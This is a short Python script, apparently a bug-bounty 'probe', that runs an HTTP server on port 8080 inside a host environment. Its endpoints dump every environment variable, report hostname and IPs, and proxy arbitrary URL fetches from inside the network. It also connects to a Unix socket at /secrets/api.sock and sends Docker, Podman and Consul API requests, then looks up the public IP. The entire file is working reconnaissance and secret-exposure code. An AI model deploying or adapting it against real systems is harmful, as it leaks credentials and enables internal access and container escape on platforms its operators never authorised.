import os, json, socket, urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

def fetch(url, timeout=6):
    try:
        req = urllib.request.Request(url, headers={"User-Agent":"bbhunt-probe"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read(4096)
            return {"status": r.status, "headers": dict(r.headers), "body": body.decode("utf-8","replace")}
    except Exception as e:
        return {"error": repr(e)}

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/env":
            data = {"environ": dict(os.environ)}
        elif self.path == "/net":
            data = {"hostname": socket.gethostname(), "fqdn": socket.getfqdn(),
                    "host_ips": socket.gethostbyname_ex(socket.gethostname())}
        elif self.path.startswith("/fetch?url="):
            data = fetch(self.path.split("=",1)[1])
        elif self.path == "/sock":
            import stat as st, socket as sk
            out = {}
            p = "/secrets/api.sock"
            try:
                m = st.stat(p); out["mode"] = oct(st.S_IMODE(m.st_mode)); out["is_socket"] = st.S_ISSOCK(m.st_mode)
            except Exception as e: out["stat"] = repr(e)
            paths = ["/_ping","/v1.41/_ping","/v4.0.0/libpod/info","/v1/agent/self","/version","/v1.41/version","/v4.0.0/libpod/containers/json"]
            for reqp in paths:
                try:
                    s = sk.socket(sk.AF_UNIX, sk.SOCK_STREAM); s.settimeout(5); s.connect(p)
                    s.sendall(f"GET {reqp} HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n".encode())
                    buf=b""
                    while True:
                        d=s.recv(4096)
                        if not d: break
                        buf+=d
                        if len(buf)>8000: break
                    s.close()
                    out[reqp] = buf.decode("utf-8","replace")[:4000]
                except Exception as e:
                    out[reqp] = repr(e)
            data = out
        elif self.path == "/ip":
            data = fetch("https://api.ipify.org?format=json")
        else:
            data = {"app": "bbhunt-probe", "ok": True}
        body = json.dumps(data, indent=1).encode()
        self.send_response(200)
        self.send_header("Content-Type","application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def log_message(self, *a): pass

HTTPServer(("0.0.0.0", 8080), H).serve_forever()
